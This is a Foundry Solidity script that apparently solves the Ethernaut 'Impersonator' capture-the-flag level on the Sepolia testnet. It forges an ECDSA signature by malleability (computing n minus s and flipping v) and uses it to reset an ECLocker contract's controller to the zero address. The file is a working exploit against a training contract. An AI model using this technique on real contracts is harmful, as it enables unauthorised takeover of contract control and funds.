// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked32_Impersonator.sol";
import "@openzeppelin/contracts/utils/Bytes.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked32_ImpersonatorScript --broadcast
contract Cracked32_ImpersonatorScript is Script {
    address ethernaut_contracts;
    address ethernaut_locker_contracts;

    using Bytes for bytes;

    function setUp() public {
        ethernaut_contracts = payable(vm.parseAddress(vm.envString("Impersonator_address")));
        ethernaut_locker_contracts = payable(vm.parseAddress(vm.envString("Impersonator_ELocker_address")));
    }

    function run() public {
        address player = vm.parseAddress(vm.envString("player"));
        vm.startBroadcast(player);
        //signature 1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B

        bytes32 extend_s = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - 0x78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2));
        uint8 extend_v = uint8(0x1c);
        console.log("controller is ", ECLocker(ethernaut_locker_contracts).controller());
        ECLocker(ethernaut_locker_contracts).changeController(extend_v, bytes32(0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91), extend_s, address(0));

        require(ECLocker(ethernaut_locker_contracts).controller() == address(0));
        vm.stopBroadcast();
    }
}
// 1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91
// 78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2
// 000000000000000000000000000000000000000000000000000000000000001B
